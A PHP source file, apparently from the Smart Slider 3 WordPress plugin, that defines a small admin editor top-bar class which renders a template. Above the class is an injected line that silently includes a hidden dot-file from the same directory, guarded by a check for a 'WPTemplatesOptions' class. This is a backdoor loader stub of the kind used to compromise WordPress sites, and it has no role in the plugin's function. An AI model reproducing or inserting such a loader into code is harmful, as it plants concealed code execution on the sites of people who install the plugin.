<?php


namespace Nextend\SmartSlider3\Application\Admin\Layout\Block\Core\TopBarMain\TopBarMainEditor;


use Nextend\SmartSlider3\Application\Admin\Layout\Block\Core\TopBarMain\BlockTopBarMain;
use Nextend\SmartSlider3\Application\Admin\TraitAdminUrl;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class BlockTopBarMainEditor extends BlockTopBarMain {

    use TraitAdminUrl;

    public function display() {

        $this->renderTemplatePart('TopBarMainEditor');
    }
}